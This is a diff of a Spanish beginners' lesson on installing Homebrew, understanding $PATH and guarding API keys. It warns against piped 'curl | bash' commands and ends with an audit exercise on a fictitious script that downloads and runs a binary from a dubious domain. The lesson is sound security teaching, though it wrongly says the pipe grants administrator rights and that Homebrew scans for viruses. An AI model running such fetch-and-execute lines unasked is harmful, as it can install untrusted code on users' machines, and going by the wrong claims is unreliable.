@@ -1,15 +1,205 @@
 ---
 title: "Lección 09 — Terminal II: instalar herramientas y claves"
-description: "Homebrew, variables de entorno y preparación del entorno de trabajo."
+description: "Aprender a instalar software con Homebrew, entender el PATH y custodiar tus claves de API con seguridad."
 ---
 
-import { Aside } from '@astrojs/starlight/components';
+import Callout from '../../../components/ui/Callout.astro';
+import Analogia from '../../../components/ui/Analogia.astro';
+import Terminal from '../../../components/ui/Terminal.astro';
+import Pasos from '../../../components/ui/Pasos.astro';
+import Paso from '../../../components/ui/Paso.astro';
+import Reto from '../../../components/ui/Reto.astro';
+import Verificado from '../../../components/ui/Verificado.astro';
+import Termino from '../../../components/ui/Termino.astro';
+import Herbario from '../../../components/ui/Herbario.astro';
 
-<Aside type="note" title="Lección en preparación (Fase 1: Andamiaje)">
-Esta página forma parte de la estructura base del curso (identificador interno: **L08**, orden en el itinerario: **9**).
+import ExplicadorComandos from '../../../components/widgets/explicador-comandos/ExplicadorComandos.tsx';
+import AnimacionPath from '../../../components/widgets/animacion-path/AnimacionPath.tsx';
 
-El contenido completo, los interactivos y las prácticas de laboratorio se incorporarán en las siguientes fases del plan de trabajo.
-</Aside>
+<Verificado
+  fecha="2026-03"
+  fuente="https://brew.sh/"
+  nota="Instrucción de instalación oficial de Homebrew (The Missing Package Manager for macOS) y documentación estándar de variables de entorno zsh."
+/>
 
 ## Objetivo de la lección
-Homebrew, variables de entorno y preparación del entorno de trabajo.
+Dominar la instalación de programas de inteligencia artificial mediante el gestor Homebrew, entender cómo el sistema localiza herramientas con la variable `$PATH` y aprender a custodiar tus claves de API para no comprometer tu seguridad.
+
+---
+
+## 1. El vivero oficial de macOS: Homebrew
+
+En tu día a día con el Mac, cuando quieres instalar una aplicación como WhatsApp o Zoom, buscas un archivo `.dmg` en internet, lo abres y arrastras el icono a la carpeta de Aplicaciones.
+
+En el mundo de los agentes de inteligencia artificial y la programación, las herramientas no suelen venir empaquetadas en bonitas ventanas con dibujos. Vienen en forma de bibliotecas y pequeños programas de consola. 
+
+Para no tener que compilar nada a mano, la comunidad de Apple creó **Homebrew** *(el «gestor de paquetes que le faltaba a macOS»)*:
+- Con un solo comando (`brew install nombre`), Homebrew descarga la versión correcta para tu chip de Apple, comprueba que no tenga virus, instala sus dependencias y la deja lista para usar.
+- Con `brew update && brew upgrade`, actualiza todas tus herramientas a la vez en cuestión de segundos.
+
+<Analogia
+  concepto="Homebrew y las variables de entorno"
+  metafora="El vivero botánico certificado y los gradientes hormonales en la savia vegetal"
+  limite="En la botánica viva, las hormonas (auxinas, citoquininas) interactúan mediante concentraciones químicas difusas y gradientes osmóticos dinámicos. En la informática, Homebrew es un gestor de archivos binarios determinista y las variables de entorno son simples cadenas de texto plano compartidas en la memoria del sistema operativo."
+>
+- **Homebrew** es como acudir a un vivero forestal oficial con pasaporte fitosanitario: te garantiza que el plantón de roble que compras está sano, libre de hongos parásitos y adaptado exactamente al clima de tu parcela.
+- **Las variables de entorno** son como los nutrientes y sales que circulan por los vasos de la savia: cualquier hoja o brote de la planta que necesite hierro o fósforo puede absorberlo directamente del torrente general sin tener que fabricarlo ella misma.
+</Analogia>
+
+---
+
+## 2. ¿Cómo sabe tu Mac qué programa ejecutar? La variable `$PATH`
+
+Seguro que te has preguntado: cuando escribes `ls` o `git` en la terminal, ¿cómo sabe el Mac dónde está guardado ese programa en el disco duro?
+
+La respuesta está en una variable especial llamada **`$PATH`** *(la ruta)*. 
+
+El `$PATH` es una lista ordenada de carpetas separadas por dos puntos. Cuando tecleas el nombre de un comando, tu Mac abre la primera carpeta de la lista. Si el programa está allí, lo ejecuta y se detiene. Si no está, mira en la segunda carpeta; si tampoco, en la tercera... y si llega al final sin encontrarlo, te muestra el célebre error: `zsh: command not found`.
+
+Compruébalo con esta animación paso a paso:
+
+<AnimacionPath client:visible />
+
+<Callout tipo="info" titulo="¿Por qué en Apple Silicon las herramientas viven en /opt/homebrew?">
+En los Mac modernos con chips M1, M2, M3 o M4, Homebrew instala todos sus programas en la carpeta `/opt/homebrew/bin` para mantenerlos separados y limpios de las herramientas antiguas de Intel (que vivían en `/usr/local/bin`). 
+Al instalar Homebrew por primera vez, el instalador te pedirá añadir esa carpeta a tu `$PATH` para que el sistema la encuentre de inmediato.
+</Callout>
+
+---
+
+## 3. Desarmando comandos largos sin miedo
+
+Muchas guías de inteligencia artificial te pedirán copiar comandos que parecen jeroglíficos incomprensibles. Pulsa en cada fragmento del siguiente explicador interactivo para ver qué hace cada bandera:
+
+<ExplicadorComandos client:visible />
+
+### ⚠️ El peligro de «curl | bash»
+
+Verás con frecuencia tutoriales que te dicen: *«Copia este comando y pégalo en tu terminal: `curl -fsSL https://ejemplo.com/instalar.sh | bash`»*.
+
+Entiende qué significa el símbolo de la barra vertical **`|`** (la tubería o *pipe*): **descarga un archivo de internet y ejecútalo inmediatamente con permisos de administrador en mi ordenador sin que yo lo lea antes**.
+
+<Callout tipo="peligro" titulo="Regla de oro de seguridad">
+**Jamás ejecutes un `curl | bash` de una página desconocida.**
+Si no estás 100% seguro de la procedencia del script:
+1. Abre primero la dirección web en Safari y lee el código del archivo de texto.
+2. Comprueba que provenga de una organización de prestigio contrastado (como `brew.sh`, `github.com` oficial o la documentación de Python).
+</Callout>
+
+---
+
+## 4. Claves de API: Tu tarjeta de crédito digital
+
+A partir del Bloque 3 empezaremos a trabajar con agentes que se comunican con modelos como Claude o ChatGPT a través de su interfaz de programación (API). 
+
+Para identificarte ante el proveedor, necesitas una **Clave de API** (*API Key*), que tiene el aspecto de una cadena alfanumérica larga: `sk-proj-7a8b9c...`.
+
+### Las tres leyes de las claves secretas:
+1. **Trátala como el PIN de tu tarjeta de crédito:** Cualquier persona que consiga tu clave puede enviar miles de peticiones a la IA a tu costa y OpenAI o Anthropic te cobrarán el consumo en tu tarjeta.
+2. **Jamás la pegues en el código que compartas:** Existen miles de bots maliciosos escaneando GitHub en tiempo real las 24 horas del día. Si subes por error un archivo con tu clave, los bots la detectarán y consumirán tu saldo en menos de dos minutos.
+3. **Guárdala en variables de entorno o archivos `.env`:** El lugar correcto para guardar una clave es la memoria temporal de tu terminal o un archivo oculto local que nunca se publica.
+
+---
+
+## Práctica en tu Mac: Instalar Homebrew y tu primera herramienta
+
+Vamos a instalar Homebrew en tu Mac y a probar tu primera variable de entorno:
+
+<Pasos>
+  <Paso numero={1} titulo="Abre tu Terminal de macOS">
+    Abre la aplicación Terminal con Spotlight (`Cmd + Espacio` $\to$ *Terminal* $\to$ Enter).
+  </Paso>
+  <Paso numero={2} titulo="Instala Homebrew con el comando oficial">
+    Copia y pega exactamente la siguiente instrucción oficial verificada:
+    <Terminal
+      comando='/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"'
+      explicacion="Descarga y ejecuta el instalador oficial de Homebrew verificado desde su repositorio en GitHub."
+    />
+    El instalador te pedirá la contraseña de tu Mac (al teclear la contraseña en la terminal no aparecerán asteriscos por seguridad; teclea tu clave y pulsa Enter).
+  </Paso>
+  <Paso numero={3} titulo="Sigue las instrucciones de Next steps si aparecen">
+    Al terminar, si tu terminal te muestra un mensaje con el encabezado *«==> Next steps:»*, copia y ejecuta las 2 líneas que te indique (suelen empezar por `echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' >> ~/.zprofile`).
+  </Paso>
+  <Paso numero={4} titulo="Instala la utilidad 'tree'">
+    Comprueba que Homebrew funciona instalando una herramienta para ver carpetas:
+    <Terminal
+      comando="brew install tree"
+      explicacion="Descarga e instala el programa 'tree' en tu Mac."
+    />
+    Una vez instalado, entra en tu carpeta de prácticas y escribe `tree`. ¡Verás un esquema visual perfecto de tus carpetas!
+  </Paso>
+  <Paso numero={5} titulo="Prueba a crear una variable de entorno de laboratorio">
+    En la misma ventana, escribe:
+    <Terminal
+      comando='export MI_VARIABLE_BOTANICA="Roble centenario"'
+      explicacion="Crea una variable temporal en la memoria de tu sesión."
+    />
+    Ahora pídele a la terminal que la lea:
+    <Terminal
+      comando='echo $MI_VARIABLE_BOTANICA'
+      explicacion="Imprime en pantalla el valor almacenado en la variable."
+    />
+    Verás cómo devuelve *«Roble centenario»*. Así es exactamente como los agentes leerán tus claves de API sin que tengas que escribirlas cada vez.
+  </Paso>
+</Pasos>
+
+---
+
+## Reto final: Auditoría de un script de instalación
+
+<Reto
+  titulo="El examen del analista de seguridad"
+  dificultad="media"
+  tiempo="15 min"
+>
+Observa atentamente este script de instalación ficticio que un usuario ha encontrado en un foro de internet:
+
+```bash
+#!/bin/bash
+echo "Iniciando instalación del asistente botánico..."
+mkdir -p "$HOME/.botanica/bin"
+curl -fsSL "https://descargas-dudosas-ia.org/botanica-mac" -o "$HOME/.botanica/bin/botanica"
+chmod +x "$HOME/.botanica/bin/botanica"
+export PATH="$HOME/.botanica/bin:$PATH"
+echo "¡Instalación completada!"
+```
+
+**Tu misión:**
+1. Explica qué hace cada una de las 4 líneas principales del script.
+2. ¿Qué significa la bandera `-o` en el comando `curl`?
+3. ¿Por qué el comando `chmod +x` es necesario para que el archivo pueda ejecutarse?
+4. **Veredicto crítico:** ¿Ejecutarías este script en tu Mac tal cual está escrito? Justifica tu respuesta fijándote especialmente en la dirección web de origen.
+</Reto>
+
+---
+
+## Resumen y glosario botánico-digital
+
+<Herbario
+  items={[
+    {
+      termino: "Homebrew (brew)",
+      definicion: "El gestor de paquetes de referencia para macOS. Permite instalar, actualizar y desinstalar utilidades de software libre con una sola instrucción."
+    },
+    {
+      termino: "Variable de entorno",
+      definicion: "Dato con nombre (como $PATH o $OPENAI_API_KEY) almacenado en la memoria del sistema operativo que cualquier programa puede consultar para conocer configuraciones o credenciales."
+    },
+    {
+      termino: "$PATH",
+      definicion: "Variable de entorno que contiene la lista de directorios donde macOS busca los programas ejecutables cuando escribes un comando por su nombre en la consola."
+    },
+    {
+      termino: "Clave de API (API Key)",
+      definicion: "Credencial secreta alfanumérica que autentica a un usuario o aplicación ante los servidores de un proveedor de inteligencia artificial para facturar su consumo."
+    },
+    {
+      termino: "Tubería (| o Pipe)",
+      definicion: "Operador de Unix que conecta la salida de un programa directamente con la entrada de otro (por ejemplo, enviando el texto descargado por curl a la shell bash)."
+    },
+    {
+      termino: "~/.zshrc",
+      definicion: "Archivo de configuración personal que zsh lee automáticamente al abrir cada nueva ventana de terminal, ideal para guardar variables de entorno permanentes."
+    }
+  ]}
+/>
